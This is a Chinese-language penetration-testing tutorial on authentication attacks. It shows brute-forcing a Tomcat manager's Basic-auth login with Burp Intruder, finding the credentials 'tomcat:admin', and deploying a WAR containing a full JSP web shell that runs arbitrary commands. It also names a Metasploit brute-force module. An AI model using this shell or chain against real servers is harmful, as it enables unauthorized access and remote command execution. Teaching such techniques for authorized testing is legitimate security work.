## 身份认证介绍 

身份认证技术是在计算机网络中确认操作者身份的过程而产生的有效解决方法。 

计算机网络世界中一切信息包括用户的身份信息都是用一组特定的数据来表示的，计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。

身份认证攻击就是为了使用各种办法通过这层认证，突破作为防护网络资产的第一道关口，身份认证攻击在渗透测试中有着举足轻重的作用。

## Web认证攻击 

常见web登陆口只有用户名跟密码, 没有验证码, 可以使用 BurpSuite 的 Intruder 模块进行暴力破解。

## Basic认证攻击

### Tomcat 暴力破解

#### 发现 Tomcat 登录界面

![image-20210915112040521](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915112040521.png)

#### Burpsuite 抓包

![image-20210915112255779](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915112255779.png)

发现使用 Basic 认证加密, 观察推测可能是 Basic64 , 解码后发现格式为 `用户名:密码`

#### Intruder 暴力破解

使用自定义迭代器, 位置1 为用户名, 位置2 为密码, 分割符为 `:` , 并使用 Base64 编码转化 。

![image-20210915114605641](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915114605641.png)

![image-20210915113701889](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915113701889.png)

发现返回数据较大的请求, 对 Basic 字段进行 Base64 解码, 得到 `tomcat:admin`

![image-20210915114855296](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915114855296.png)

#### 登录后台

尝试使用 `tomcat:admin` 登录, 进入后台 。

![image-20210915115302063](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915115302063.png)

#### 上传 war 包

新建 shell.jsp 文件，转化为 war 文件。

```jsp
<%
if("x".equals(request.getParameter("pwd")))
{
java.io.InputStream
in=Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
int a=-1;
byte[]b=new byte[2048];
out.print("<pre>");
while((a=in.read(b))!=-1)
{
out.println(new String(b));
}
out.print("</pre>");
}
%>
```

![image-20210915120726229](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915120726229.png)

后台选择生成的 war 文件，然后 Deploy。

![image-20210915121340863](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915121340863.png)

#### 传递参数执行命令

![image-20210915123358550](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915123358550.png)

![image-20210915123631057](https://cdn.jsdelivr.net/gh/yzbtdiy/cdn@security/imgs/authentication_attack/image-20210915123631057.png)

**MSF 的 `auxiliary/scanner/http/tomcat_mgr_login` 模块也可以对 Tomcat 后台登录进行暴力破解**

